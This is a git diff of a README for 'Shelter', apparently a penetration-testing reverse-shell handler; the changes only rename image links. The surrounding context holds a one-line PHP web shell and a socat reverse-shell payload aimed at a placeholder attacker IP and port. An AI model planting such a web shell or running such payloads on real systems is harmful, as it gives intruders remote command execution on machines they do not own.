@@ -2,7 +2,7 @@
 ***
 
 Shelter the magical Shell Handler.
-![](img/Pasted image 20210428200307.png)
+![](img/Pasted_image_20210428200307.png)
 ## What is it ?
 
 Shelter is a new way to catch reverse shell's and also reduces the effort of visiting `pentestmonkey` and `highoncoffee`frequently for reverse shell payloads and changing of the `Attacker-IP` and `Attacker-Port` everytime.
@@ -85,7 +85,7 @@ optional arguments:
 ```
 
 #### Taking a reverse shell from a docker container.
-![](img/Pasted image 20210428201310.png)
+![](img/Pasted_image_20210428201310.png)
 
 ### Web Module
 #### Help Menu
@@ -113,7 +113,7 @@ root@6a647b5a3d5f:~# cat cmd.php
 <?php system($_GET[cmd]); ?>
 ```
 #### Webshell on a docker container.
-![](img/Pasted image 20210428202006.png)
+![](img/Pasted_image_20210428202006.png)
 
 ### Webrev Module
 #### Help Menu
@@ -158,7 +158,7 @@ Available Payloads:
     socat               socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:'bash',pty,stderr,setsid,sigint,sane
 ```
 #### Revshell on a docker container.
-![](img/Pasted image 20210428223306.png)
+![](img/Pasted_image_20210428223306.png)
 
 ***
 # Disclaimer
